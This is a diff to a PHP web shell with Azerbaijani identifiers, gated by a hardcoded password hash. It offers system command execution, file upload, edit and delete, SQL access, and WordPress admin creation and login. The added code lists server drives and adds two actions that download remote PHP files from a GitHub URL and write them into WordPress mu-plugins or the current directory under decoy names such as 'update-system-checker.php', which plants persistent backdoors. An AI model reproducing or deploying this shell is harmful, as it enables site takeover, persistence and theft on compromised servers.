@@ -1,32 +1,69 @@
 <?php
+
 session_start();
 
 $user = 'grimreaper';
 $password = 'e78ef3c493a8558972d5c5bd8dee9050';
 
 function notFound() {
-	http_response_code(404);
 	die;
 }
-
-if (isset($_GET['user']) && isset($_GET['password'])) {
-	if ($password != md5($_GET['password'])) {
-		notFound();
-	}
-	$_SESSION['loggedin'] = true;
-} else {
-	if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == true) {
-		goto start;
-	}
+if (!isset($_GET['user']) || !isset($_GET['password'])) {
 	notFound();
 }
-
-start:
+if ($password != md5($_GET['password'])) {
+	notFound();
+}
 $baqliFunksiyalar = explode(",", "");
 $safeMode = true;
-$actions = array("esas","fayl_oxu","phpinfo","sistem_kom","fayl_redakte","fayl_yukle",'fayl_sil','fayl_yarat','papka_yarat','fayl_sifirla' , 'papka_sil','fayl_ad_deyish', 'ziple' , 'skl' , 'skl_d_t' , 'skl_d', 'fayl_upl','set_wp_load','create_wp_admin','login_wp','chmod','chmod_folder');
+$actions = array("esas","fayl_oxu","phpinfo","sistem_kom","fayl_redakte","fayl_yukle",'fayl_sil','fayl_yarat','papka_yarat','fayl_sifirla' , 'papka_sil','fayl_ad_deyish', 'ziple' , 'skl' , 'skl_d_t' , 'skl_d', 'fayl_upl','set_wp_load','create_wp_admin','login_wp','create_st_folder','create_shb_file','chmod','chmod_folder');
 $ne = isset($_POST['ne']) && in_array($_POST['ne'],$actions) ? $_POST['ne'] : "esas";
+function listDrives() {
+    $drives = [];
 
+    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+        $output = shell_exec("wmic logicaldisk get name 2>&1");
+        preg_match_all('/[A-Z]:/', $output, $matches);
+        $drives = $matches[0] ?? [];
+    } else {
+        $output = shell_exec("lsblk -nr -o MOUNTPOINT 2>/dev/null");
+        $lines = explode("\n", trim($output));
+        foreach ($lines as $line) {
+            if (!empty($line) && $line !== '/') {
+                $drives[] = trim($line);
+            }
+        }
+    }
+    return array_values($drives);
+}
+function formatListDisk() {
+	$html = '';
+	foreach (listDrives() as $key => $value) {
+		$html .= '[<a href="javascript:sehife(\'?qovluq='.urlencode(urlencode(shifrele($value))).'\')">' . $value . '</a>]';
+	}
+	return $html;
+}
+function curl_data($url) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        $data = curl_exec($ch);
+        curl_close($ch);
+    } else {
+        $context = stream_context_create([
+            'ssl' => [
+                'verify_peer' => false,
+                'verify_peer_name' => false,
+            ]
+        ]);
+        $data = file_get_contents($url, false, $context);
+    }
+    return $data;
+}
 function shifrele($str)
 {
 	$f = 'bas';
@@ -72,7 +109,7 @@ function qovluquYaz()
 		$sonDir[] = "<a href='javascript:sehife(\"?qovluq=".urlencode(urlencode(shifrele($umumiHisseler)))."\")'>".htmlspecialchars(empty($hisse)&&$ii!=count($parse)?'/':$hisse)."</a>";
 	}
 	$sonDir = implode("/", $sonDir);
-	print $sonDir . '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;( <a href="">Reset</a> | <a href="javascript:goto()">Go to</a> )';
+	print $sonDir . '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;( <a href="">Reset</a> | <a href="javascript:goto()">Go to</a> )&nbsp;&nbsp;' . formatListDisk();
 }
 function sizeFormat($bytes)
 {
@@ -447,6 +484,24 @@ else if ($ne == 'login_wp') {
 	} catch (\Throwable $th) {
 		print $th->getMessage();
 	}
+}
+else if ($ne == 'create_st_folder') {
+	$filename = isset($_GET['filename']) ? $_GET['filename'] : $_POST['filename'];
+	$folder = $default_dir . DIRECTORY_SEPARATOR . 'mu-plugins';
+	if (strpos($folder, 'wp-content') !== false) {
+		if (!is_dir($folder)) {
+			mkdir($folder, 0755, true); // Creates folder with permissions and recursive mode
+		}
+		$file_contentx = curl_data('https://raw.githubusercontent.com/jazzplunker97/trash/refs/heads/main/update-system-checker.php');
+		file_put_contents($folder . DIRECTORY_SEPARATOR . $filename, $file_contentx);
+		print "Plugin Installed Successfully.";
+	}
+}
+else if ($ne == 'create_shb_file') {
+	$filename = isset($_GET['filename']) ? $_GET['filename'] : $_POST['filename'];
+	$file_contentx = curl_data('https://raw.githubusercontent.com/jazzplunker97/trash/refs/heads/main/horizon.php');
+	file_put_contents($default_dir . DIRECTORY_SEPARATOR . $filename, $file_contentx);
+	print "Plugin Installed Successfully.";
 }
 else if ($ne == 'chmod') {
 	$mod = isset($_POST['mod']) ? $_POST['mod'] : $_GET['mod'];
@@ -966,7 +1021,7 @@ print "</tbody></table>";
 ?>
 
 <hr>
-<a href="javascript:newFile();">Yeni fayl</a> | <a href="javascript:newPapka();">Yeni papka</a> | <a href="javascript:createWpAdmin();">Create WP Admin</a> | <a href="javascript:loginWP();">Login WP</a><br>
+<a href="javascript:newFile();">Yeni fayl</a> | <a href="javascript:newPapka();">Yeni papka</a> | <a href="javascript:createWpAdmin();">Create WP Admin</a> | <a href="javascript:loginWP();">Login WP</a> | <a href="javascript:createWpAdmin();">Create WP Admin</a> | <a href="javascript:createStFolder();">ST-Folder</a> | <a href="javascript:createShbFile();">SHB-File</a><br>
 <a href="javascript:sehife('?ne=sistem_kom&qovluq=<?=urlencode(urlencode(shifrele($default_dir)))?>')">Icra edin</a><br>
 <a href="javascript:sehife('?ne=skl');">SQL</a><br>
 
@@ -1060,6 +1115,20 @@ function createWpAdmin()
 	var password = prompt('Password:');
 	if (username && email && password) {
 		sehife("?ne=create_wp_admin&wp_username=" + username + "&wp_email=" + email + "&wp_password=" + password + "&qovluq=<?=urlencode(urlencode(shifrele($default_dir)))?>");
+	}
+}
+function createStFolder()
+{
+	var filename = prompt('Name:', 'update-system-checker.php');
+	if (filename) {
+		sehife("?ne=create_st_folder&filename=" + filename + "&qovluq=<?=urlencode(urlencode(shifrele($default_dir)))?>");
+	}
+}
+function createShbFile()
+{
+	var filename = prompt('Name:', 'bootstrap.php');
+	if (filename) {
+		sehife("?ne=create_shb_file&filename=" + filename + "&qovluq=<?=urlencode(urlencode(shifrele($default_dir)))?>");
 	}
 }
 function loginWP()
